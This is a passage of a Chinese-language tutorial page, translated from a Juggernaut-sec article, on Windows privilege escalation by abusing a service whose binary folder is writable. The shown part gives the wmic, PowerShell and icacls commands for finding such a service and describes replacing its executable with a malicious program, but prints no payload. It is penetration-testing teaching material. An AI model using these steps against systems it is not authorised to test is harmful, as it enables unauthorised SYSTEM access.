<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Windows 提权-服务_弱文件_目录权限 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows 提权-服务_弱文件_目录权限 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 Weak Service File Permissions – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 Weak Service File Permissions – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.3453dfb7.css">
<script src="/web/assets/js/runtime~main.799afac8.js" defer="defer"></script>
<script src="/web/assets/js/main.73484f69.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">🛠️软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/️渗透">🕵️渗透</a><button aria-label="折叠侧边栏分类 &#x27;🕵️渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="展开侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="折叠侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-MSSQL">Windows 提权-MSSQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare">Windows 提权-PrintNightmare</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-RunAs">Windows 提权-RunAs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeBackupPrivilege 特权">Windows 提权-SeBackupPrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权">Windows 提权-SeImpersonatePrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-UAC 绕过">Windows 提权-UAC 绕过</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-不安全的 GUI 程序">Windows 提权-不安全的 GUI 程序</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_1">Windows 提权-内核利用_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_2">Windows 提权-内核利用_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-密码搜寻">Windows 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-手工枚举">Windows 提权-手工枚举</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_DLL 劫持">Windows 提权-服务_DLL 劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限">Windows 提权-服务_弱文件_目录权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限">Windows 提权-服务_弱服务权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限">Windows 提权-服务_弱注册表权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_未引用的服务路径">Windows 提权-服务_未引用的服务路径</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">🐧Linux</a><button aria-label="展开侧边栏分类 &#x27;🐧Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">💻Windows</a><button aria-label="展开侧边栏分类 &#x27;💻Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">📦杂项</a><button aria-label="展开侧边栏分类 &#x27;📦杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/️渗透"><span itemprop="name">🕵️渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/windows-提权"><span itemprop="name">Windows 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Windows 提权-服务_弱文件_目录权限</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows 提权-服务_弱文件_目录权限</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/weak-service-file-permissions/" target="_blank" rel="noopener noreferrer">Weak Service File Permissions – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 搜寻非标准服务</a></li>
<li><a href="#id2">2 搜寻服务的弱权限文件</a>
<ul>
<li><a href="#id2.1">2.1 枚举服务的弱权限文件 – icacls</a></li>
<li><a href="#id2.2">2.2 枚举服务的弱权限文件 – Accesschk</a></li>
</ul>
</li>
<li><a href="#id3">3 工具自动化搜寻弱服务</a>
<ul>
<li><a href="#id3.1">3.1 PowerUp</a></li>
<li><a href="#id3.2">3.2 winPEAS</a></li>
</ul>
</li>
<li><a href="#id4">4 利用服务的弱权限文件</a></li>
<li><a href="#id5">5 滥用 PowerUp.ps1 功能</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将探讨一个涉及弱权限的服务漏洞。不过，不是服务本身存在弱权限，而是服务启动程序所在的目录存在弱权限，该目录允许普通用户也能往其中写入文件。在这里，我们将学习如何滥用服务的弱权限文件，将权限从普通用户提升到 SYSTEM。</p>
<p>首先，我们需要找到这种可以滥用的<strong>漏洞服务</strong>，而这类服务通常具有以下特征：</p>
<ol>
<li>服务启动程序所在的目录当前普通用户也能够读写。【标准服务(即系统服务)对应的标准目录（<code>C:\Windows\</code>）通常不满足这个要求，所以标准服务可以先跳过。】</li>
<li>服务的启动类型是“自动”，即开机自启。</li>
</ol>
<p>等所有的服务枚举完成之后，我们还需要制作一个恶意程序，以替换服务现有的启动程序，然后通过重启服务提升至 SYSTEM。</p>
<p>在此示例中，假设我们已经作为标准用户 bob 在目标机上获得了立足点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121744682-1840975474-1daa3e9128fd27dde75892eed36759ba.png" width="632" height="401" class="img_ev3q"></p>
<p>同时，我们看到用户 bob 拥有 SeShutdownPrivilege 权限，而这一点在稍后利用服务获取 SYSTEM shell 时非常重要，因为需要以重启主机的方式重启服务。</p>
<blockquote>
<p>尽管特权 SeShutdownPrivilege 显示 &quot;Disabled&quot;，但我们仍然可以使用该权限，因为这些特权的禁用和启用只会影响某些 <strong>程序或服务</strong>，当这些进程在尝试关机时，必须“请求”此特权。而对于在 GUI（桌面菜单关机）或 CLI（关机命令 shutdown /s） 下的用户来说并不适用。</p>
</blockquote>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1搜寻非标准服务"><strong><div id="id1">1、搜寻非标准服务</div></strong><a href="#1搜寻非标准服务" class="hash-link" aria-label="1搜寻非标准服务的直接链接" title="1搜寻非标准服务的直接链接">​</a></h2>
<p>为了尽快找到可以滥用的服务，我们通常优先从那些非标准服务查起，即从系统中的非标准目录启动服务程序的服务查起。因为，微软对系统标准目录的权限进行了加固，而从非标准目录执行的服务才最有可能发现弱权限文件。</p>
<blockquote>
<p>注：标准服务是指系统服务，这类服务的启动程序通常都在 <code>C:\WINDOWS\</code> 目录中，所以该目录属于标准目录。同时，<code>C:\Program Files</code> 和 <code>C:\Program Files (x86)</code> 目录应该也属于标准目录，因为它们是微软指定用户安装程序的默认位置，这个位置普通用户通常也只有读的权限没有写的权限。除了这三个目录以外的其它目录如果有服务程序，那么很可能就有戏。</p>
</blockquote>
<p>我们可以使用下面的 wmic 命令来查找从非标准位置执行的任何服务：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wmic service get name,displayname,startmode,pathname | findstr /i /v &quot;C:\Windows\\&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121744757-810826569-12747bcf749d9803f0c9bd0e99ac10c5.png" width="879" height="344" class="img_ev3q"></p>
<p>在上面的命令中，我们使用 wmic 查询我们感兴趣的服务字段。同时配合 findstr 命令过滤了标准目录 <code>C:\Windows</code> 。</p>
<p>而在上面输出的结果中，有一个名为 Juggernaut 的服务很符合漏洞服务的特征，它的服务启动程序是 <code>C:\Program Files\Juggernaut\Juggernaut.exe</code>，同时该服务还是一个自启动服务。</p>
<p>另外，与上面 cmd 命令等效的 PowerShell 命令是：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where { $_.PathName -notlike &quot;C:\Windows*&quot; } | select Name,DisplayName,StartMode,PathName</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745545-192470271-15f99f2f1c2022013f1f06c0dce10294.png" width="991" height="284" class="img_ev3q"></p>
<p>既然找到了感兴趣的服务，那么接下来，就要仔细检查与该服务相关的目录和文件的权限，以确定该服务是否可以被滥用。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2搜寻服务的弱权限文件"><strong><div id="id2">2、搜寻服务的弱权限文件</div></strong><a href="#2搜寻服务的弱权限文件" class="hash-link" aria-label="2搜寻服务的弱权限文件的直接链接" title="2搜寻服务的弱权限文件的直接链接">​</a></h2>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21枚举服务的弱权限文件--icacls"><strong><div id="id2.1">2.1、枚举服务的弱权限文件 – icacls</div></strong><a href="#21枚举服务的弱权限文件--icacls" class="hash-link" aria-label="21枚举服务的弱权限文件--icacls的直接链接" title="21枚举服务的弱权限文件--icacls的直接链接">​</a></h4>
<p>为此，我们可以使用 icacls 命令，该命令是一个用于检查目录和文件 ACL 权限的内置命令。而为了能理解 icacls 命令输出的信息，我们需要了解以下关于权限和用户组相关的知识：</p>
<p>【<strong>知识1</strong>】：我们要查找的目录权限只要是以下三种权限中的任意一种均可：</p>
<ul>
<li>(F) Full Control【完全控制】</li>
<li>(M) Modify【修改】</li>
<li>(W) Write【写入】</li>
</ul>
<p>【<strong>知识2</strong>】：我们会经常见到的用户/组如下：</p>
<ul>
<li>当前登录用户，如 bob。</li>
<li>Authenticated Users【注：通过 <strong>控制台、RDP、WinRM、SMB</strong> 登录系统的用户都属于已认证用户。】</li>
<li>Everyone</li>
<li>BUILTIN\Users</li>
<li>NT AUTHORITY\INTERACTIVE</li>
</ul>
<p>好了，在学习了上面的知识之后，接下来让我们看看 <code>C:\Program Files\Juggernaut</code> 目录的权限，我们可以使用以下命令：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">icacls &quot;C:\Program Files\Juggernaut&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745627-1811025882-5ca3df02a8dbf3a743696e9657729ee4.png" width="960" height="300" class="img_ev3q"></p>
<p>这表明 BUILTIN\Users 组的用户拥有该目录的完全控制权。同时，这也意味着我们对服务启动程序可能也拥有完全控制权，因为在默认情况下文件会继承自己所在目录的权限，让我们继续确认下：</p>
